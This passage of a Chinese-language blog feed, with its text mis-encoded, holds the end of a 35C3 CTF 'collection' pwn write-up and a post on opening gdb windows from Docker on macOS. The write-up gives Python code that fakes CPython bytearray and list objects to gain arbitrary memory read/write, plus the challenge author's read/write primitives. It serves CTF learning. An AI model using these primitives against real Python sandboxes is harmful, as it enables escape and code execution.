<span class="keyword">char</span> *ob_start;      <span class="comment">/* Logical start inside ob_bytes */</span></span><br><span class="line">    <span class="comment">/* XXX(nnorwitz): should ob_exports be Py_ssize_t? */</span></span><br><span class="line">    <span class="keyword">int</span> ob_exports;      <span class="comment">/* How many buffer exports */</span></span><br><span class="line">&#125; PyByteArrayObject;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>ob_bytes</code>å¤§å®¶åº”è¯¥å°±æ”¾å¿ƒäº†ï¼Œè¿™ç›´æ¥å°±æ˜¯ä¸€ä¸ªç¼“å†²åŒºï¼Œå¯ä»¥ç›´æ¥æ›´æ”¹ï¼Œsizeä¹Ÿå¯æ§ï¼Œæ‰€ä»¥å¦‚æœèƒ½ä¼ªé€ ä¸€ä¸ªbytearrayï¼Œå°±å¯ä»¥ä»»æ„è¯»å†™äº†ã€‚</p><p>æ‰€ä»¥æ€»ç»“ä¸€ä¸‹æ€è·¯ï¼š</p><ol><li>å»ºç«‹ä¸€ä¸ªç›®æ ‡bytearray</li><li>åˆ©ç”¨bytesä¼ªé€ ä¸€ä¸ªlistï¼Œ<code>id(X) + 0x20</code>å³ä¸ºå†™å…¥çš„byteså†…å®¹çš„åœ°å€ï¼ˆè¿™ä¸ªå¯ä»¥è°ƒè¯•å¾—åˆ°ï¼‰ï¼ŒæŒ‡é’ˆæ•°ç»„è®¾ç½®ä¸ºbytearrayåœ°å€çš„<code>ob_bytes</code>ä½ç½®</li><li>åˆ©ç”¨æ„é€ çš„listï¼Œå°†ä¸€ä¸ªæ–°çš„bytearrayçš„åœ°å€å†™å…¥åˆ°ç¬¬ä¸€æ­¥ä¸­çš„bytearrayçš„<code>ob_bytes</code>å’Œ<code>ob_start</code>ä½ç½®</li><li>è¿™æ ·å°±å·²ç»åšåˆ°ä»»æ„è¯»å†™äº†ï¼Œæ¯æ¬¡ä¿®æ”¹ç¬¬ä¸€æ­¥çš„bytearrayï¼Œè®©ä»–çš„å†…å®¹æ˜¯ä¸€ä¸ªä¼ªé€ çš„bytearrayï¼Œåœ°å€æŒ‡å‘éœ€è¦è¯»å†™çš„åœ°å€ï¼Œç„¶åä½¿ç”¨ç¬¬ä¸‰æ­¥çš„è¿›è¡Œè¯»å†™</li></ol><p>åæ¥ä¸è€æ„è¯†åˆ° æˆ‘ä»¬éœ€è¦ç»•ä¸€ä¸‹ bytearary å’Œ list ,æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">subs = [].__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> subs:</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytearray&#x27;</span>:</span><br><span class="line">        bytearray = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">        list = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytes&#x27;</span>:</span><br><span class="line">        bytes = cls</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å»æ„é€ æˆ‘ä»¬çš„ä»»æ„è¯»å†™ï¼š</p><figure class="highlight plain"><figcaption><span>set_addr(addr):</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    payload &#x3D; p64(0x10) + p64(id(bytearray)) + p64(0x1000) + p64(0x1001) + \</span><br><span class="line">            p64(addr) + p64(addr)</span><br><span class="line">    for i in range(6 * 8):</span><br><span class="line">        buf[i] &#x3D; payload[i]</span><br><span class="line"></span><br><span class="line">def arbitrary_read(addr, length):</span><br><span class="line">    set_addr(addr) </span><br><span class="line"></span><br><span class="line">    assert length &lt; 0x1000 # can be larger, but .. really?</span><br><span class="line">    return some[:length]</span><br><span class="line"></span><br><span class="line">def arbitrary_write(addr, length, buf):</span><br><span class="line">    set_addr(addr)</span><br><span class="line"></span><br><span class="line">    for i in range(length):</span><br><span class="line">        some[i] &#x3D; buf[i]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ä¹‹åå‘¢ï¼Œæœ‰äº†ä»»æ„è¯»å†™ä¹‹åå°±å¾ˆç®€å•äº†ï¼Œæœ‰äº†æ‰“å¼€çš„flagçš„fdï¼Œæœ‰&#96;readv&#96;å’Œ&#96;write&#96;ï¼Œæ„é€ å¥½æ•°æ®è¿›è¡Œè¯»å–å³å¯ã€‚æ¥ç€æ„é€ ä¸€ä¸ªropã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å®Œæ•´EXPè§ 35c3CTF [collection writeup](https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3747)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œgdb set stop-on-solib-events 1å°±èƒ½æ–­ä¸‹æ¥ã€‚</span><br><span class="line"></span><br><span class="line">å¦å¤–åœ¨ç»“æŸåï¼Œæˆ‘ä¹Ÿçœ‹äº†ä¸€ä¸‹ä½œè€…çš„ [exploit](https:&#x2F;&#x2F;github.com&#x2F;bkth&#x2F;35c3ctf&#x2F;blob&#x2F;master&#x2F;collection&#x2F;dist_exploit.py) ï¼Œä½œè€…è¿™é‡Œç”¨äº† array.array è¿™æ ·çš„ä¸€ä¸ªå¯¹è±¡</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â€‹&#96;&#96;&#96;c</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    typedef struct arrayobject &#123;</span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    char *ob_item;  &#x2F;&#x2F; &lt;- Make this point to the address you want to read&#x2F;write</span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">    const struct arraydescr *; &#x2F;&#x2F; &lt;- Make this point to &quot;L&quot; for long</span><br><span class="line">    PyObject *weakreflist;</span><br><span class="line">    int ob_exports;</span><br><span class="line">&#125; arrayobject;</span><br></pre></td></tr></table></figure><p>å®ƒä¸Listæœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†å…³äºè¿™ç§ç±»å‹çš„é‡è¦ä¸€ç‚¹æ˜¯å®ƒçš„å†…å®¹å­˜å‚¨ä¸ºCç±»å‹è€Œä¸æ˜¯Pythonå¯¹è±¡ï¼æœ‰äº†è¿™ä¸ªï¼Œä»»æ„è¯»å†™éƒ½ä¼šéå¸¸å®¹æ˜“</p><p>å› æ­¤å°±æ²¡æœ‰äº†èµ·é‚£ä¹ˆçš„é‚£äº›ç±»å‹ç»•è¿‡ï¼š</p><p>ä½œè€…çš„ ä»»æ„è¯»å†™å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">addr</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:0x00000000000000010x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:0x00000000000000040x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:0x00000000000000040x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:0x00000000000000000x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    <span class="keyword">return</span> fakeobj[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr, val</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:0x00000000000000010x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:0x00000000000000040x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:0x00000000000000040x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:0x00000000000000000x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    fakeobj[<span class="number">0</span>] = val</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><p><a href="https://xz.aliyun.com/t/3747">https://xz.aliyun.com/t/3747</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Python </tag>
            
            <tag> 35c3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker for Mac and gdb GUI windows</title>
      <link href="Docker-for-Mac-and-run-gdb-GUI-window.html"/>
      <url>Docker-for-Mac-and-run-gdb-GUI-window.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p> Docker for Mac and GUI applications and gdb GUI windows</p><p>æˆ‘ä¸ºå•¥æœ‰è¿™éœ€æ±‚å‘¢ï¼Ÿ ä»¥å‰ Pwntools + gdb.attach è¿›è¡Œè°ƒè¯•çš„æ—¶å€™æˆ‘ç”¨è¿‡ä¸€æ®µæ—¶é—´çš„ tmux</p><p>åƒä¸‹é¢è¿™æ ·ï¼š</p><p>å…ˆåœ¨ Python è„šæœ¬åŠ ä¸Š <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/tmux-gdb.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/tmux-gdb.png"></a> </p><p>é¡ºä¾¿ä¸€ææˆ‘ tmux çš„è®¾ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> -g prefix C<span class="_">-a</span></span><br><span class="line"><span class="built_in">set</span> -g default-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line">set-window-option -g mode-keys vi</span><br><span class="line"><span class="built_in">bind</span> h select-pane -L</span><br><span class="line"><span class="built_in">bind</span> j select-pane -D</span><br><span class="line"><span class="built_in">bind</span> k select-pane -U</span><br><span class="line"><span class="built_in">bind</span> l select-pane -R</span><br><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> \ split-window -h</span><br><span class="line"><span class="built_in">bind</span> - split-window -v</span><br><span class="line"><span class="built_in">set</span> -g mouse-utf8 on</span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line"></span><br><span class="line">unbind C-b</span><br><span class="line"></span><br><span class="line"><span class="comment"># bind a reload key</span></span><br><span class="line"><span class="built_in">bind</span> R source-file ~/.tmux.conf ; display-message <span class="string">&quot;Config reloaded..&quot;</span></span><br><span class="line"></span><br><span class="line">set-option -g mouse on</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™æ ·çœ‹èµ·æ¥ä¹Ÿä¸é”™å•¦<del>~</del></p><p>ç”±äºåæ¥æˆ‘ç”¨èµ·äº† Docker ç„¶åæˆ‘å°±å¼€å§‹æƒ³èƒ½ä¸èƒ½åœ¨ docker é‡Œå¾€å¤–é¢å¼¹ä¸€ä¸ª gdb è°ƒè¯•çª—å£â€¦ç„¶åå°±æœ‰äº†è¿™ä¸ªæƒ³æ³•ï¼š</p><h3 id="XQuartz"><a href="#XQuartz" class="headerlink" title="XQuartz"></a>XQuartz</h3><p>é¦–å…ˆ  æˆ‘ä»¬éœ€è¦ <a href="https://www.xquartz.org/">XQuartz</a> </p><p><code>brew cask install xquartz</code></p><p>XQuartz ä¸»è¦ä½œä¸ºä¸€ä¸ªæ–°ç»ˆç«¯çš„æ‰¿è½½å™¨å’Œ host æœºå™¨å’Œ Docker çš„é€šè®¯å™¨ã€‚</p><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>å‡†å¤‡å¥½ä½ çš„Docker ç”±äºæˆ‘è¿™ä¸»è¦ç”¨æ¥è°ƒè¯•ä¸€äº› Pwn é¢˜ï¼Œæ‰€ä»¥æˆ‘ä¼šæœ‰è‡ªå·±çš„ä¾èµ–æ”¯æŒï¼Œæ¯”å¦‚ Pwntools ã€onegadget ä¹‹ç±»çš„ä¸œè¥¿â€¦å®‰è£…å•¥çš„æˆ‘å°±ä¸è¯´äº† ç¯å¢ƒå¯å‚è€ƒæˆ‘çš„ Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Apt packages</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  apt-get clean</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    DEBIAN_FRONTEND=noninteractive apt-get install -y \</span></span><br><span class="line"><span class="bash">    git nasm  python \</span></span><br><span class="line"><span class="bash">    build-essential \</span></span><br><span class="line"><span class="bash">    python-dev python-pip python-setuptools \</span></span><br><span class="line"><span class="bash">    libc6-dbg \</span></span><br><span class="line"><span class="bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="bash">    gcc-multilib \</span></span><br><span class="line"><span class="bash">    gdb-multiarch \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    wget \</span></span><br><span class="line"><span class="bash">    curl \</span></span><br><span class="line"><span class="bash">    glibc-source \</span></span><br><span class="line"><span class="bash">    cmake \</span></span><br><span class="line"><span class="bash">    python-capstone \</span></span><br><span class="line"><span class="bash">    socat \</span></span><br><span class="line"><span class="bash">    netcat \</span></span><br><span class="line"><span class="bash">    ruby \</span></span><br><span class="line"><span class="bash">    lxterminal \</span></span><br><span class="line"><span class="bash">    fish</span></span><br><span class="line">    <span class="comment"># apt-get clean &amp;&amp; \</span></span><br><span class="line">    <span class="comment"># rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* &amp;&amp; \</span></span><br><span class="line">    <span class="comment"># cd ~ &amp;&amp; tar -xvf /usr/src/glibc/glibc-2.23.tar.xz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python/ruby packages &amp; gdb-plugin</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install --no-cache-dir pwntools ropper ancypatch swpwn &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install one_gadget &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git installaing package</span></span><br><span class="line"><span class="comment"># RUN cd ~/ &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     git clone https://github.com/pwndbg/pwndbg.git &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     cd ~/pwndbg/ &amp;&amp; ./setup.sh &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> ~/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/longld/peda.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> ~/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    cp ~/Pwngdb/.gdbinit ~/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/pwn&quot;</span>]</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Go"><a href="#Go" class="headerlink" title="Go!"></a>Go!</h1><p>åœ¨ç»ˆç«¯é‡Œè¿è¡Œ XQuartz å¹¶è®¾ç½®ï¼š</p><p><code>open -a XQuartz</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20181210234056.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20181210234056.png"></a></p><h3 id="Set-run-docker-script"><a href="#Set-run-docker-script" class="headerlink" title="Set run docker script"></a>Set run docker script</h3><p>è¿™é‡Œæˆ‘é€‰æ‹©ä¸€ä¸ªè½»é‡çš„ç»ˆç«¯ï¼š<strong>lxterminal</strong> , åœ¨Docker é‡Œå®‰è£…è¿™ä¸ªç»ˆç«¯ï¼ˆDockerfile é‡Œå·²ç»æœ‰ï¼‰ï¼Œç„¶åè·å–å½“å‰ HOST æœºå™¨çš„ IP</p><p><code>ip=$(ifconfig en0 | grep inet | awk &#39;$1==&quot;inet&quot; &#123;print $2&#125;&#39;)</code></p><p>æ¥ç€åªè¦è®¾ç½®å®¹å™¨å†…ç¯å¢ƒå˜é‡å³å¯ï¼š</p><p><code>docker run -d --name pwn -e DISPLAY=$ip:0 -v /tmp/.X11-unix:/tmp/.X11-uni</code></p><p>å½“ç„¶è¿™é‡Œå’±ä»¬å¯ä»¥é€‰æ‹©ç”¨è„šæœ¬ä¸€é”®ç®¡ç† ï¼š <a href="https://github.com/WinMin/ancypwn/blob/master/ancypwn.py">ancypwn</a></p><p>æ­¤å¤–åœ¨ Python script ä¸Šè¿˜å¾—åŠ ä¸Š <code>context.terminal = [&quot;lxterminal&quot;, &quot;-e&quot;]</code></p><p>æˆ–è€…æˆ‘è¿™é‡Œè¿›è¡Œäº†è½»é‡é­”æ”¹ï¼Œè„šæœ¬è§æœ€åï¼Œå…ˆçœ‹ä¸€çœ¼æ•ˆæœï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/gdb-windows.gif" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/gdb-windows.gif"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span 